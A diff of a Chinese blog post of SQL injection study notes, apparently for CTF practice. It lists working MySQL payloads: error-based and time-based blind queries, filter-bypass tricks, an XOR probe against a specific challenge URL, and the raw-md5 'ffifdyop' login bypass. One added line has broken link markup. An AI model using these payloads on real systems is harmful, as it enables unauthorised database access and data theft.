@@ -91,17 +91,17 @@
 
 
 
-<meta name="description" content="基于报错的sql注入  关于SQL注入的五大报错注入函数 报错型sql注入原理分析  select * from test where id = &amp;#39;1&amp;#39; and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x">
+<meta name="description" content="基于报错的sql注入  关于SQL注入的五大报错注入函数 报错型sql注入原理分析 报错函数floor、ExtractValue、UpdateXml、GeometryCollection、polygon、multipoint、multlinestring、multpolygon、linestring  select * from test where id = &amp;#39;1&amp;#39; and (">
 <meta name="keywords" content="笔记">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入学习笔记">
 <meta property="og:url" content="http://yoursite.com/2018/03/12/SQL注入学习笔记/index.html">
 <meta property="og:site_name" content="zgjx的博客">
-<meta property="og:description" content="基于报错的sql注入  关于SQL注入的五大报错注入函数 报错型sql注入原理分析  select * from test where id = &amp;#39;1&amp;#39; and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x">
-<meta property="og:updated_time" content="2018-06-11T06:07:22.293Z">
+<meta property="og:description" content="基于报错的sql注入  关于SQL注入的五大报错注入函数 报错型sql注入原理分析 报错函数floor、ExtractValue、UpdateXml、GeometryCollection、polygon、multipoint、multlinestring、multpolygon、linestring  select * from test where id = &amp;#39;1&amp;#39; and (">
+<meta property="og:updated_time" content="2018-09-14T09:03:59.282Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入学习笔记">
-<meta name="twitter:description" content="基于报错的sql注入  关于SQL注入的五大报错注入函数 报错型sql注入原理分析  select * from test where id = &amp;#39;1&amp;#39; and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x">
+<meta name="twitter:description" content="基于报错的sql注入  关于SQL注入的五大报错注入函数 报错型sql注入原理分析 报错函数floor、ExtractValue、UpdateXml、GeometryCollection、polygon、multipoint、multlinestring、multpolygon、linestring  select * from test where id = &amp;#39;1&amp;#39; and (">
 
 
 
@@ -365,9 +365,10 @@
 <li><p>基于报错的sql注入</p>
 <ul>
 <li><a href="https://www.cnblogs.com/Dleo/p/5493782.html" target="_blank" rel="external">关于SQL注入的五大报错注入函数</a></li>
-<li><p><a href="http://blog.51cto.com/wt7315/1891458" target="_blank" rel="external">报错型sql注入原理分析</a></p>
+<li><a href="http://blog.51cto.com/wt7315/1891458" target="_blank" rel="external">报错型sql注入原理分析</a></li>
+<li><p>报错函数<code>floor</code>、<code>ExtractValue</code>、<code>UpdateXml</code>、<code>GeometryCollection</code>、<code>polygon</code>、<code>multipoint</code>、<code>multlinestring</code>、<code>multpolygon</code>、<code>linestring</code></p>
 </li>
-<li><p><code>select * from test where id = &#39;1&#39; and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)</code>#concat,结果会多一个1或0</p>
+<li><p><code>select * from test where id = &#39;1&#39; and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code>#concat,结果会多一个1或0</p>
 </li>
 <li><code>select * from test where id = &#39;1&#39; and (extractvalue(1, concat(0x5c,(select database()))))</code>#extractvalue,(有长度限制,最长32位)</li>
 <li><code>select * from test where id = &#39;1&#39; and EXP(~(SELECT * from(select database())a))</code>#EXP,版本在5.5.5及其以上</li>
@@ -375,7 +376,7 @@
 <li><code>select !(select * from (select version())x) - ~0</code>#bigint超出范围；~0是对0逐位取反.版本在5.5.5及其以上</li>
 <li><p><code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x</code>#mysql列名不能重复特性，此处重复了version，所以报错。</p>
 </li>
-<li><p>报错一次只能查询一列，可用group_concat，如：<code>select * from test where id = &#39;1&#39; and EXP(~(SELECT * from(SELECT group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=&#39;test&#39;)a))</code></p>
+<li><p>报错一次只能查询一列，可用group_concat，如：<code>select * from test where id = &#39;1&#39; and EXP(~(SELECT * from(SELECT group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database())a))</code></p>
 </li>
 <li>如果关键的表被禁用了，可以使用这种形式<code>select count(*) from (select 1 union select null union select !1) as t group by concat(version(),floor(rand(0)*2))</code></li>
 <li>如果<code>rand</code>被禁用了可以使用用户变量来报错<code>select min(@a:=1) from information_schema.tables group by concat(VERSION(),@a:=(@a+1)%2)</code></li>
@@ -384,7 +385,7 @@
 <li><p>宽字节注入<br>  %DF’</p>
 </li>
 <li>SQL约束攻击<br>  数据库宽松模式下，插入数据长度超过字段限制时，仅插入允许的最长部分。</li>
-<li>INSERT INTO注入</li>
+<li>INSERT INTO注入<br>  可用时间盲注(<a href="https://blog.csdn.net/u011377996/article/details/79340100" target="_blank" rel="external">https://blog.csdn.net/u011377996/article/details/79340100</a>)</li>
 <li>DS_store源码泄露</li>
 <li><p><code>stacked injection</code>堆叠注入，一次执行多条语句</p>
 </li>
@@ -406,8 +407,8 @@
 </li>
 <li><p>技巧</p>
 <ul>
-<li>当空格被过滤时，通常用()<code>(select(ascii(mid((select(flag)from(flag))from(1)))&lt;&gt;103));</code>或者/**/代替空格</li>
-<li>内联注释<code>/*or*/</code>、双重关键字oorr、大小写混用Or、编码(hex，urlencode)、符号(and=&amp;&amp;,or=||)</li>
+<li>当空格被过滤时，通常用()<code>(select(ascii(mid((select(flag)from(flag))from(1)))&lt;&gt;103));</code>或者/**/或+代替空格</li>
+<li>内联注释<code>/*or*/</code>、双重关键字oorr(中间可用其他被过滤的关键字)、大小写混用Or、编码(hex，urlencode)、符号(and=&amp;&amp;,or=||)</li>
 <li>字符串使用16进制替换，如’root’替换为0x726f6f74，不需要带引号</li>
 <li>char(27)代替单引号</li>
 <li>空格绕过<ul>
@@ -420,7 +421,6 @@
 </ul>
 </li>
 <li>group_concat-多列联合到一列，concat多行联合到一行，concat_ws基本同concat(但第一个参数为分隔符)</li>
-<li>复制参数:id=1&amp;id=1</li>
 <li>字符串截取函数<code>MID(column_name,start[,length])</code>,<code>substr(string, start, length)</code>,<code>Left(string,n)</code>.<code>substr()</code>同<code>substring()</code>.</li>
 <li><a href="http://www.cnblogs.com/lcamry/p/5504374.htm" target="_blank" rel="external">Sql注入截取字符串常用函数</a></li>
 <li><code>ORD()</code>此函数为返回第一个字符的ASCII码</li>
@@ -432,6 +432,14 @@
 <li><code>SELECT.....INTO OUTFILE &#39;file_name&#39;</code>可以把被选择的行写入一个文件中</li>
 <li><code>HPP(HTTP参数污染攻击)</code>，构造含多个相同参数的请求</li>
 <li>order by <code>rand(true/false)</code>结果不同</li>
+<li>异或注入:判断过滤<code>http://120.24.86.145:9004/1ndex.php?id=1&#39;^(length(&#39;union&#39;)=5)%23</code>当union被过滤时1^0 输出id=1;当union没被过滤时 1 ^ 1 输出 id=0.</li>
+<li><code>hex</code>用于将字符串转为16进制</li>
+<li><p>猜到字段名的盲注(bugku-login3(SKCTF))</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">payload = <span class="string">"password"</span></div><div class="line">payload_len = tamper(<span class="string">"(length("</span>, <span class="string">")&#123;0&#125;&#123;1&#125;)"</span>)</div><div class="line">payload_data = tamper(<span class="string">"(ASCII(SUBSTRING(("</span>, <span class="string">")from(&#123;0&#125;)))&#123;1&#125;&#123;2&#125;)"</span>)</div></pre></td></tr></table></figure>
+</li>
+<li><p>使用未定义函数可爆数据库名,如<code>username=&#39; or &#39;1&amp;password=&#39; or pcat() or &#39;1</code>,<code>FUNCTION error_based_hpf.pcat does not exist</code></p>
+</li>
+<li>逗号可以使用join绕过<code>ffff&#39; union select * from ((select 1)a join (select 2)b join (select 3)c join (select 4)d) #</code></li>
 </ul>
 </li>
 <li><p>mysql常用函数  </p>
@@ -441,24 +449,27 @@
 <li>version()——MySQL 版本</li>
 <li>user()——数据库用户名</li>
 <li>database()——数据库名</li>
-<li>@@basedir/@@datadir——数据库路径</li>
+<li>@@basedir/@@datadir——安装路径/数据库路径</li>
 <li>@@version_compile_os——操作系统版本</li>
+<li>system_user()——系统用户名</li>
 </ol>
 <ul>
-<li><p>一般用于尝试的语句<br>–+可以用#替换， url 提交过程中 Url 编码后的#为%23  </p>
+<li><p>一般用于尝试的语句</p>
 <ul>
-<li>or 1=1–+</li>
-<li>‘or 1=1–+  </li>
-<li>“or 1=1–+</li>
-<li>)or 1=1–+</li>
-<li>‘)or 1=1–+</li>
-<li>“) or 1=1–+</li>
-<li>“))or 1=1–+</li>
+<li>– +可以用#替换， url 提交过程中 Url 编码后的#为%23，注意特殊字符<code>&#39;&quot;= )</code>或关键字<code>or</code>等可能被过滤；另外可将<code>1=1</code>换成<code>sleep(5)</code></li>
+<li>or 1=1– +</li>
+<li>‘or 1=1– +  </li>
+<li>“or 1=1– +</li>
+<li>)or 1=1– +</li>
+<li>‘)or 1=1– +</li>
+<li>“) or 1=1– +</li>
+<li>“))or 1=1– +</li>
 </ul>
 </li>
 <li><p>SQL盲注</p>
 <ul>
 <li><code>If(ascii(substr(database(),0,1))=115,1,sleep(5))</code>数据库名第一个字母为s则正确，否则延时5s</li>
+<li><code>select case when ascii(substring((select database()) from 0 for 1))=115 then 1 else sleep(5) end</code>同上</li>
 </ul>
 </li>
 <li><p>PHP相关函数及绕过</p>
@@ -469,6 +480,9 @@
 <li><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符:\x00、\n、\r、\、’、”、\x1a</li>
 </ul>
 </li>
+</ul>
+<ul>
+<li>md5注入<code>$sql = &quot;SELECT * FROM admin WHERE pass = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code>(<a href="https://blog.csdn.net/greyfreedom/article/details/45846137),密码为`129581926211651571912466741651878684928`或`ffifdyop`md5转16进制后含类似`&#39;or" target="_blank" rel="external">https://blog.csdn.net/greyfreedom/article/details/45846137),密码为`129581926211651571912466741651878684928`或`ffifdyop`md5转16进制后含类似`&#39;or</a>‘<trash>`字符串</trash></li>
 </ul>
 
       
@@ -587,7 +601,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-count">30</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
